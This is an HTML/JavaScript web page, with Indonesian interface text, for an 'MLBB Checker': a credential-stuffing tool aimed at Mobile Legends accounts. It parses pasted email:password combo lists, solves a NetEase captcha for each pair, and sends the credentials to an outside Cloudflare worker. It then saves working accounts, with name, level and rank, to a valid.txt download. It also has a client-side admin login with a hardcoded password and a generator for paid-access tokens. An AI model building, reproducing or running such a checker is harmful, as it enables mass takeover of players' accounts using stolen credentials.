<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin & Client Panel</title>
<style>
  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#121212; color:#eee; margin:0; padding:0; }
  header { background:#1f1f1f; padding:1rem; text-align:center; font-size:1.5rem; }
  .container { max-width:900px; margin:2rem auto; padding:1rem; background:#1a1a1a; border-radius:12px; box-shadow:0 0 15px rgba(0,0,0,0.5); }
  input, button, textarea { font-family: inherit; font-size:1rem; margin:0.25rem 0; padding:0.5rem; border-radius:6px; border:1px solid #333; background:#222; color:#eee; width:100%; box-sizing:border-box; }
  button { cursor:pointer; border:none; }
  button.primary { background:#4caf50; color:#fff; }
  button.danger { background:#f44336; color:#fff; }
  button.info { background:#2196f3; color:#fff; }
  #log { background:#000; color:#eee; height:200px; overflow-y:auto; padding:0.5rem; border-radius:6px; margin-top:1rem; font-family: monospace; white-space: pre-wrap;}
  .hidden { display:none; }
  .flex { display:flex; gap:0.5rem; flex-wrap:wrap; }
  .token-box { background:#222; padding:0.5rem 1rem; border-radius:6px; margin-top:0.5rem; display:flex; justify-content:space-between; align-items:center; }
</style>
</head>
<body>

<header>Admin & Client Panel</header>

<div class="container">

  <!-- Admin Login -->
  <div id="adminLogin">
    <h2>Admin Login</h2>
    <input type="password" id="adminPassword" placeholder="Enter admin password">
    <button class="primary" id="adminLoginBtn">Login</button>
    <div id="adminLoginMsg"></div>
  </div>

  <!-- Admin Panel -->
  <div id="adminPanel" class="hidden">
    <h2>Admin Panel</h2>
    <label>Generate Client Token:</label>
    <div class="flex">
      <input type="number" id="tokenCount" placeholder="Jumlah token" min="1">
      <input type="number" id="tokenExpire" placeholder="Masa aktif (menit)" min="1">
      <button class="primary" id="generateTokens">Generate</button>
    </div>
    <div id="tokenList"></div>
  </div>

  <hr style="margin:2rem 0; border-color:#333;">

  <!-- Client Panel -->
  <div id="clientPanel">
    <h2>Client Access</h2>
    <input type="text" id="clientToken" placeholder="Paste your token here">
    <button class="primary" id="clientLoginBtn">Access Checker</button>

    <div id="checkerSection" class="hidden">
      <h3>MLBB Checker</h3>
      <textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com:Pass456"></textarea>
      <button class="primary" id="startBtn">Start Checking</button>
      <button class="danger" id="stopBtn" disabled>Stop</button>
      <button class="info" id="downloadBtn">Download valid.txt</button>
      <div id="status" style="margin-top:10px;"></div>
      <div id="captcha-root"></div>
      <div id="log"></div>
    </div>
  </div>

</div>

<script src="https://cstaticdun.126.net/load.min.js"></script>

<script>
// ===== Admin Login =====
const ADMIN_PASSWORD = "Azib7783"; //
const adminLoginDiv = document.getElementById("adminLogin");
const adminPanelDiv = document.getElementById("adminPanel");
const adminLoginBtn = document.getElementById("adminLoginBtn");
const adminLoginMsg = document.getElementById("adminLoginMsg");
const tokenListDiv = document.getElementById("tokenList");

let tokens = []; // list token client

adminLoginBtn.addEventListener("click", () => {
  const pw = document.getElementById("adminPassword").value;
  if(pw === ADMIN_PASSWORD){
    adminLoginDiv.classList.add("hidden");
    adminPanelDiv.classList.remove("hidden");
  } else {
    adminLoginMsg.textContent = "Password salah!";
  }
});

// ===== Generate Client Tokens =====
document.getElementById("generateTokens").addEventListener("click", () => {
  const count = parseInt(document.getElementById("tokenCount").value);
  const expire = parseInt(document.getElementById("tokenExpire").value);
  if(!count || !expire) return alert("Isi jumlah token dan masa aktif!");
  for(let i=0;i<count;i++){
    const token = Math.random().toString(36).substring(2,12).toUpperCase();
    const expTime = Date.now() + expire*60*1000;
    tokens.push({token, expire: expTime});
    const div = document.createElement("div");
    div.className="token-box";
    div.innerHTML = `<span>${token}</span> <span>Exp: ${expire} menit</span>`;
    tokenListDiv.appendChild(div);
  }
});

// ===== Client Login =====
const clientLoginBtn = document.getElementById("clientLoginBtn");
const clientPanelDiv = document.getElementById("clientPanel");
const checkerSection = document.getElementById("checkerSection");

clientLoginBtn.addEventListener("click", () => {
  const ctoken = document.getElementById("clientToken").value.trim().toUpperCase();
  const tok = tokens.find(t=>t.token===ctoken && t.expire>Date.now());
  if(tok){
    alert("Token valid! Mengakses checker...");
    checkerSection.classList.remove("hidden");
  } else {
    alert("Token invalid atau expired!");
  }
});

// ===== MLBB Checker (NECaptcha) =====
const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; 
const WORKER_URL = "https://bebas.bonar7527.workers.dev";

let combos = [], currentIndex=0, stopRequested=false, neCaptchaInstance=null, validResults=[];

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");
const downloadBtn = document.getElementById("downloadBtn");
const comboTextarea = document.getElementById("combo");

function appendLog(text, cls){ 
  const time = new Date().toLocaleTimeString();
  const div = document.createElement("div");
  div.textContent=`[${time}] ${text}`;
  if(cls) div.className=cls;
  logEl.appendChild(div);
  logEl.scrollTop = logEl.scrollHeight;
}

function parseCombos(text){
  return text.split(/\r?\n/).map(l=>l.trim()).filter(Boolean).map(line=>{
    let e,p;
    if(line.includes("|")) [e,p]=line.split("|",2);
    else if(line.includes(":")) [e,p]=line.split(":",2);
    else { appendLog(`Format salah: ${line}`,"info"); return null;}
    return {email:e.trim(), password:p.trim()};
  }).filter(Boolean);
}

function showCaptchaOnce(){
  return new Promise((resolve,reject)=>{
    const root = document.getElementById("captcha-root");
    root.innerHTML="";
    if(!window.initNECaptcha){ appendLog("initNECaptcha missing","info"); reject("missing"); return;}
    if(neCaptchaInstance && neCaptchaInstance.destroy) neCaptchaInstance.destroy();
    initNECaptcha({
      captchaId:CAPTCHA_ID,
      element:"#captcha-root",
      mode:"embed",
      width:"320px",
      onVerify(err,data){
        if(err){ appendLog("Captcha error: "+err,"bad"); reject(err); return;}
        if(!data || !data.validate){ appendLog("Token captcha kosong","bad"); reject("no token"); return;}
        if(neCaptchaInstance.destroy) neCaptchaInstance.destroy();
        resolve(data.validate);
      },
      onLoad(instance){ neCaptchaInstance=instance; }
    });
  });
}

async function checkOneAccount(account){
  appendLog(`Minta captcha untuk ${account.email}`,"info");
  statusEl.textContent=`Checking ${currentIndex+1}/${combos.length}: ${account.email}`;
  let token;
  try{ token=await showCaptchaOnce(); } catch(e){ appendLog(`Captcha gagal: ${e}`,"bad"); return; }

  appendLog(`Token diterima`,"info");
  try{
    const form=new URLSearchParams();
    form.append("email",account.email);
    form.append("password",account.password);
    form.append("e_captcha",token);
    const resp=await fetch(WORKER_URL+"/check",{method:"POST",body:form,headers:{"Content-Type":"application/x-www-form-urlencoded"}});
    if(!resp.ok){ appendLog(`HTTP error ${resp.status}`,"bad"); return;}
    const data=await resp.json();
    if(data.code===0 && data.data){
      const info=data.data;
      const line=`${info.email}:${info.password} | Name:${info.name} | Level:${info.level} | Rank:${info.rank_level}`;
      appendLog(`VALID => ${line}`,"ok");
      validResults.push(line);
    } else if(data.code===1004){ appendLog(`[NOT FOUND] ${account.email}`,"bad"); }
    else if(data.code===1005){ appendLog(`[WRONG PASSWORD] ${account.email}`,"bad"); }
    else appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`,"info");
  } catch(e){ appendLog(`Error ${account.email}: ${e}`,"bad"); }
}

async function startProcess(){
  stopRequested=false; startBtn.disabled=true; stopBtn.disabled=false;
  logEl.innerHTML=""; validResults=[]; combos=parseCombos(comboTextarea.value);
  if(combos.length===0){ appendLog("Tidak ada akun untuk dicek","info"); startBtn.disabled=false; stopBtn.disabled=true; return;}
  appendLog(`Mulai cek ${combos.length} akun`,"info");
  currentIndex=0;
  while(currentIndex<combos.length){
    if(stopRequested){ appendLog("Dihentikan user","info"); break;}
    await checkOneAccount(combos[currentIndex]);
    combos.splice(currentIndex,1);
    comboTextarea.value=combos.map(c=>`${c.email}:${c.password}`).join("\n");
  }
  appendLog("Selesai","info"); statusEl.textContent="Selesai";
  startBtn.disabled=false; stopBtn.disabled=true;
}

startBtn.addEventListener("click",startProcess);
stopBtn.addEventListener("click",()=>{stopRequested=true; stopBtn.disabled=true;});
downloadBtn.addEventListener("click",()=>{
  if(validResults.length===0){ alert("Belum ada akun valid"); return;}
  const blob=new Blob([validResults.join("\n")],{type:"text/plain"});
  const url=URL.createObjectURL(blob);
  const a=document.createElement("a");
  a.href=url; a.download="valid.txt"; a.click(); URL.revokeObjectURL(url);
});
</script>

</body>
</html>
